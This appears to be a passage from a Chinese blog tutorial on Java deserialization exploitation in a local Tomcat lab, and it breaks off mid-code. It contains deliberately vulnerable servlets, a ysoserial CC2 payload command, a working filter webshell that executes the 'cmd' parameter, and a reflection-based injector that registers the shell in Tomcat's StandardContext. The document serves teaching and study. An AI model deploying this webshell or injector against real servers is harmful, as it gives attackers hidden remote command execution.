+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UploadServlet.java（简化版）</span></span><br><span class="line"><span class="comment">// @MultipartConfig 是必须的，加了这个注解 Servlet 才能处理 multipart/form-data 类型的请求（也就是文件上传表单）</span></span><br><span class="line"><span class="meta">@MultipartConfig</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 从请求里取出名为 file 的文件部分，拿到它的输入流</span></span><br><span class="line">        <span class="comment">// 此时 is 里就是用户上传文件的原始字节数据</span></span><br><span class="line">        <span class="type">Part</span> <span class="variable">filePart</span> <span class="operator">=</span> req.getPart(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> filePart.getInputStream();</span><br><span class="line">        <span class="comment">// 直接反序列化用户上传的文件——高危操作</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(is);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;upload ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-POST-参数型漏洞"><a href="#2-POST-参数型漏洞" class="headerlink" title="2. POST 参数型漏洞"></a>2. POST 参数型漏洞</h3><p>接收 Base64 编码的序列化数据，解码后反序列化：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// VulnServlet.java（简化版）</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 从 POST 请求里拿名为 data 的参数，值是 Base64 编码的字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">        <span class="comment">// 把 Base64 字符串解码成原始字节数组</span></span><br><span class="line">        <span class="comment">// Java 序列化的数据头是 AC ED 00 05，decode 之后就还原成了那个二进制数据</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(b64);</span><br><span class="line">        <span class="comment">// 把字节数组包装成流，再套一层 ObjectInputStream，准备反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 漏洞核心在这里</span></span><br><span class="line">            <span class="comment">// 直接把用户传来的数据反序列化，没有任何校验——既不验证数据来源，也不做类白名单过滤</span></span><br><span class="line">            <span class="comment">// 攻击者传什么就反序列化什么，利用链就从这里触发</span></span><br><span class="line">            ois.readObject(); <span class="comment">// 漏洞点</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="前端页面"><a href="#前端页面" class="headerlink" title="前端页面"></a>前端页面</h3><p><code>src/main/webapp/index.jsp</code>：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;反序列化漏洞测试&lt;/title&gt;</span><br><span class="line">    &lt;!-- 页面标题和字符编码声明，防止中文乱码 --&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;文件上传测试（UploadServlet）&lt;/h2&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">    enctype=<span class="string">&quot;multipart/form-data&quot;</span> — 文件上传必须用这个编码类型，浏览器才会以二进制方式发送文件内容</span><br><span class="line">    action=<span class="string">&quot;/upload&quot;</span> — 表单提交到 UploadServlet（<span class="meta">@WebServlet(&quot;/upload&quot;)</span>）</span><br><span class="line">    name=<span class="string">&quot;file&quot;</span> — 对应 Servlet 中 req.getPart(<span class="string">&quot;file&quot;</span>) 取文件</span><br><span class="line">--&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;/upload&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;Base64 参数测试（VulnServlet）&lt;/h2&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">    action=<span class="string">&quot;/vuln&quot;</span> — 提交到 VulnServlet（<span class="meta">@WebServlet(&quot;/vuln&quot;)</span>）</span><br><span class="line">    name=<span class="string">&quot;data&quot;</span> — 对应 Servlet 中 req.getParameter(<span class="string">&quot;data&quot;</span>) 取值</span><br><span class="line">--&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;/vuln&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;textarea name=<span class="string">&quot;data&quot;</span> rows=<span class="string">&quot;5&quot;</span> cols=<span class="string">&quot;60&quot;</span> placeholder=<span class="string">&quot;粘贴 Base64 编码的序列化数据&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>src/main/webapp/WEB-INF/web.xml</code> 可以添加 Tomcat 自带的 <code>SetCharacterEncodingFilter</code>，全局设置请求 &#x2F; 响应编码为 UTF-8：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.catalina.filters.SetCharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://localhost:8080/</code> 的效果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421104934589.png"></p>
+<h3 id="验证漏洞入口是否正常"><a href="#验证漏洞入口是否正常" class="headerlink" title="验证漏洞入口是否正常"></a>验证漏洞入口是否正常</h3><p>因为环境是 CC 4.0，CC1 &#x2F; CC6 用不了（依赖 CC 3.x），这里用 CC2 来验证。</p>
+<p>直接用 <code>java -jar ysoserial.jar CommonsCollections2 &quot;calc&quot;</code> 生成 Payload，或者用 GUI 工具生成：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421105624407.png"></p>
+<p>上传数据提交：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421105901539.png"></p>
+<p>两种方式都能触发计算器弹出，漏洞入口没问题：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421105922043.png"></p>
+<hr>
+<h2 id="注入流程拆解"><a href="#注入流程拆解" class="headerlink" title="注入流程拆解"></a>注入流程拆解</h2><h3 id="利用链的选择逻辑"><a href="#利用链的选择逻辑" class="headerlink" title="利用链的选择逻辑"></a>利用链的选择逻辑</h3><p>要通过利用链注入内存马，关键问题只有一个：<strong>利用链的终点能不能执行任意 Java 字节码</strong>。</p>
+<p>根据这个可以把利用链分成两类：</p>
+<p><strong>第一类：终点是 <code>TemplatesImpl</code>（如 CC2、CC3）</strong></p>
+<p>这类链的终点是 <code>TemplatesImpl.newTransformer()</code>，它会把 <code>_bytecodes</code> 字段里的字节数组还原成类并实例化，触发构造函数。注入内存马的方式非常直接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数里写内存马注入逻辑</span><br><span class="line">  → 编译成字节码</span><br><span class="line">  → 塞进 _bytecodes</span><br><span class="line">  → 序列化利用链发送</span><br><span class="line">  → 反序列化触发 newTransformer()</span><br><span class="line">  → 构造函数执行</span><br><span class="line">  → 内存马注入完成</span><br></pre></td></tr></table></figure>
+
+<p>整个过程一步到位，无文件落地，是最干净的方式，也是本文选择 CC2 的原因。</p>
+<p><strong>第二类：终点是命令执行（如 CC1、CC6）</strong></p>
+<p>这类链的终点是 <code>Runtime.exec()</code>，只能执行系统命令，没有字节码加载这一步，没办法直接把内存马字节码塞进去。这种情况通常有两种思路：</p>
+<ul>
+<li><strong>命令写文件</strong>：执行命令把 WebShell 写到磁盘，但文件会落地，失去无文件攻击的意义</li>
+<li><strong>结合 JNDI</strong>：链触发后启动恶意 JNDI 服务，目标服务器请求该服务加载远程字节码，间接完成内存马注入，多了一个中转步骤</li>
+</ul>
+<p><strong>结论</strong>：选利用链注入内存马，优先选终点是 <code>TemplatesImpl</code> 的链，字节码加载是关键，有了这一步才能把内存马逻辑直接封装进去，否则只能走间接路线。</p>
+<hr>
+<h3 id="整体执行链路"><a href="#整体执行链路" class="headerlink" title="整体执行链路"></a>整体执行链路</h3><p>下面的步骤整体思路是：先编译一个 <code>EvilFilter</code> 过滤器，Base64 后放到 <code>MemShellInject</code> 里进行解码然后注册到 Tomcat，这就是完整的内存马；然后再把 <code>MemShellInject</code> 编码放入 CC2 链的 <code>_bytecodes</code> 里，这样服务器收到 CC2 链触发反序列化，会实例化运行 <code>_bytecodes</code> 里的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. EvilFilter.java 编译 → 转 Base64</span><br><span class="line"></span><br><span class="line">2. Base64 填进 MemShellInject 构造函数</span><br><span class="line">   构造函数里做：</span><br><span class="line">     → Base64 解码还原 EvilFilter</span><br><span class="line">     → defineClass 加载进 JVM</span><br><span class="line">     → 注册到 Tomcat</span><br><span class="line"></span><br><span class="line">3. MemShellInject 转成字节数组 → 填进 CC2 链的 _bytecodes</span><br><span class="line"></span><br><span class="line">4. 发送给目标服务器触发反序列化</span><br><span class="line">     → CC2 链执行</span><br><span class="line">     → TemplatesImpl 加载 _bytecodes</span><br><span class="line">     → 实例化 MemShellInject</span><br><span class="line">     → 构造函数执行</span><br><span class="line">     → EvilFilter 注册到 Tomcat</span><br><span class="line">     → 内存马生效</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Step1：编写恶意组件"><a href="#Step1：编写恶意组件" class="headerlink" title="Step1：编写恶意组件"></a>Step1：编写恶意组件</h3><p>以 Filter 为例，先写一个可以执行命令的恶意 Filter：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">                         FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">// 从请求参数里拿 cmd，有值才执行，没有就放行，不影响正常请求</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 执行系统命令，拿到命令输出的流</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="comment">// 循环读取命令输出，每次读 1024 字节写进 baos，直到读完为止</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 把命令结果转成字符串写回响应，return 结束，不再往下走过滤器链</span></span><br><span class="line">            response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray()));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Step2：封装注入逻辑"><a href="#Step2：封装注入逻辑" class="headerlink" title="Step2：封装注入逻辑"></a>Step2：封装注入逻辑</h3><p>真正的核心是注入器类。它需要继承 <code>AbstractTranslet</code>（因为利用链里要用 <code>TemplatesImpl</code> 加载），然后在<strong>无参构造函数</strong>里实现所有注入逻辑，因为 CC 链最终会调用 <code>newTransformer()</code> 触发类实例化，进而执行构造函数。</p>
+<p>这里先说一下 <code>&#123;&#125;</code>、<code>static &#123;&#125;</code>、构造方法三者的区别，因为这个问题在内存马里经常遇到：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例初始化块：每次 new 对象都执行，执行顺序比构造方法早，用得很少</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态块：类第一次被 JVM 加载时执行，不管 new 多少次对象，静态块只跑一次</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造方法：每次 new 对象都执行一次</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MemShellInject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行顺序是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类加载 → static&#123;&#125; → new 对象 → &#123;&#125; → 构造方法</span><br></pre></td></tr></table></figure>
+
+<p>三种方式都能触发内存马逻辑，这里选构造方法，因为 <code>TemplatesImpl</code> 实例化的时候会调它。</p>
+<hr>
+<p>下面是注入器 <code>MemShellInject</code> 的完整代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须继承这个类，因为 CC2 链用 TemplatesImpl 加载字节码的时候，</span></span><br><span class="line"><span class="comment">// 要求被加载的类必须是 AbstractTranslet 的子类，否则报错</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemShellInject</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每次实例化都执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MemShellInject</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 第一步：获取 StandardContext</span></span><br><span class="line">            <span class="comment">// 调用下面的 getStandardContext() 方法拿到 Tomcat 的上下文，拿不到就直接退出</span></span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">ctx</span> <span class="operator">=</span> getStandardContext();</span><br><span class="line">            <span class="keyword">if</span> (ctx == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第二步：还原 EvilFilter</span></span><br><span class="line">            <span class="comment">// 把 EvilFilter 的 Base64 解码成字节数组，再通过反射调用 defineClass</span></span><br><span class="line">            <span class="comment">// 把字节数组还原成 Class，最后实例化成 Filter 对象</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> <span class="string">&quot;base64数据&quot;</span>;  <span class="comment">// 填入 Step3 输出的 EvilFilter Base64</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(b64);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 拿到当前线程的类加载器，后面用它来加载 EvilFilter 这个类</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反射拿到 ClassLoader 的 defineClass 方法</span></span><br><span class="line">            <span class="comment">// 这个方法的作用是把字节数组转成 Class 对象</span></span><br><span class="line">            <span class="comment">// 它是 protected 的，正常情况下外部不能直接调用，所以要反射</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(</span><br><span class="line">                    <span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用 defineClass，返回 EvilFilter 的 Class 对象</span></span><br><span class="line">            Class&lt;?&gt; filterClass = (Class&lt;?&gt;) defineClass.invoke(cl, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 拿到无参构造方法，实例化成 Filter 对象</span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> (Filter) filterClass.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第三步：注册到 Tomcat</span></span><br><span class="line">            <span class="comment">// FilterDef 是 Filter 的定义（是什么），FilterMap 是 Filter 的映射（拦截哪些路径）</span></span><br><span class="line">            <span class="comment">// 两个都注册进 StandardContext，最后 filterStart() 让 Filter 生效</span></span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span 